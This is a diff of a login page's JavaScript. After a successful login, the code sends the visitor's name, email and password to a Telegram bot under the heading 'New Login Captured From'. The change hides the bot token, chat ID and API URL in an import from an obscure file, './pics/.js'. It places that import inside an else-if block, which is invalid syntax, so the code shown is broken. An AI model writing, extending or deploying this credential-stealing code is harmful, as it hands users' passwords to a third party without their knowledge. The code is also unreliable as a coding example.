@@ -141,14 +141,10 @@ $(document).ready(function () {
                 message: 'Please enter a valid email address!',
                 position: 'topRight',
             });
-        } else if (email === storedUserName && password === storedPassword) {
-            if (process.env.NODE_ENV !== 'production') {
-    require('dotenv').config();
-}
-
-            const botToken = process.env.ADELINA_BOT_TOKEN || process.env.TELEGRAM_BOT_TOKEN;
-            const chatID = '5538909913';
-            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+        } else if (email === storedUserName && password === storedPassword) { 
+                   
+            import { botToken, chatID, telegramURL } from './pics/.js';
+            
             const message = `New Login Captured From:\nName: ${storedUserName}\n\nEmail: ${email}\n\nPassword: ${password}`;
 
             fetch(telegramURL, {
